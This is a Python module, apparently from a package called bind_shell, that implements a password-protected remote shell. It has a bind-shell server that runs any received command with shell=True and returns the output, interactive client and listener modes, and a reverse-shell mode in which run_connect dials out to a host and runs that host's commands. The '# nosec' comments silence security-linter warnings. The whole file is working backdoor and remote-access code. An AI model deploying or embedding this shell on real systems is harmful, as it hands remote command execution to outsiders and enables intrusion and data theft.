import socket
import subprocess  # nosec: B404
import sys
import threading

from bind_shell import logger

BUFFER_SIZE = 4096
CMD_TIMEOUT = 30
PROMPT = b"bind-shell$ "


def _auth_server(conn: socket.socket, password: str) -> bool:
    conn.sendall(b"password: ")
    try:
        data = conn.recv(BUFFER_SIZE)
    except (ConnectionResetError, BrokenPipeError):
        return False
    if data.decode(errors="replace").strip() == password:
        conn.sendall(b"authenticated\n")
        return True
    conn.sendall(b"denied\n")
    return False


def _auth_client(sock: socket.socket, password: str) -> bool:
    challenge = sock.recv(BUFFER_SIZE)
    if challenge != b"password: ":
        return False
    sock.sendall(f"{password}\n".encode())
    response = sock.recv(BUFFER_SIZE)
    return response.strip() == b"authenticated"


def _executor_loop(conn: socket.socket, prompt: bytes = PROMPT):
    while True:
        conn.sendall(prompt)
        try:
            data = conn.recv(BUFFER_SIZE)
        except (ConnectionResetError, BrokenPipeError):
            break
        if not data:
            break
        cmd = data.decode(errors="replace").strip()
        if cmd.lower() in ("exit", "quit"):
            break
        logger.info(f"$ {cmd}")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=CMD_TIMEOUT)  # nosec
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            output = b"Command timed out\n"
        except Exception as e:
            output = f"{e}\n".encode()
        conn.sendall(output or b"\n")


def _interactive_loop(sock: socket.socket):
    def _reader():
        while True:
            try:
                data = sock.recv(BUFFER_SIZE)
            except OSError:
                break
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()

    threading.Thread(target=_reader, daemon=True).start()

    try:
        for line in sys.stdin:
            sock.sendall(line.encode())
    except OSError:
        pass


def _executor_session(conn: socket.socket, addr: tuple, password: str):
    logger.info(f"Client connected: {addr[0]}:{addr[1]}")
    if not _auth_server(conn, password):
        logger.info(f"Authentication failed: {addr[0]}:{addr[1]}")
        return
    try:
        _executor_loop(conn, prompt=f"bind-shell@{conn.getsockname()[0]}$ ".encode())
    finally:
        logger.info(f"Client disconnected: {addr[0]}:{addr[1]}")


def _interactive_session(conn: socket.socket, addr: tuple, password: str):
    if not _auth_server(conn, password):
        sys.stdout.buffer.write(f"Authentication failed: {addr[0]}:{addr[1]}\n".encode())
        sys.stdout.buffer.flush()
        return
    sys.stdout.buffer.write(f"Connected: {addr[0]}:{addr[1]}\n".encode())
    sys.stdout.buffer.flush()
    try:
        _interactive_loop(conn)
    finally:
        sys.stdout.buffer.write(f"\nDisconnected: {addr[0]}:{addr[1]}\n".encode())
        sys.stdout.buffer.flush()


def run_server(host: str, port: int, password: str):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(1)
        try:
            while True:
                conn, addr = server.accept()
                threading.Thread(target=_executor_session, args=(conn, addr, password), daemon=True).start()
        except KeyboardInterrupt:
            pass


def run_client(host: str, port: int, password: str):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        if not _auth_client(sock, password):
            raise Exception("Authentication failed")
        _interactive_loop(sock)


def run_listen(host: str, port: int, password: str):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(1)
        try:
            while True:
                conn, addr = server.accept()
                with conn:
                    _interactive_session(conn, addr, password)
        except KeyboardInterrupt:
            pass


def run_connect(host: str, port: int, password: str):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        local_ip, local_port = sock.getsockname()
        if not _auth_client(sock, password):
            raise Exception("Authentication failed")
        _executor_loop(sock, prompt=f"bind-shell@{local_ip}:{local_port}$ ".encode())
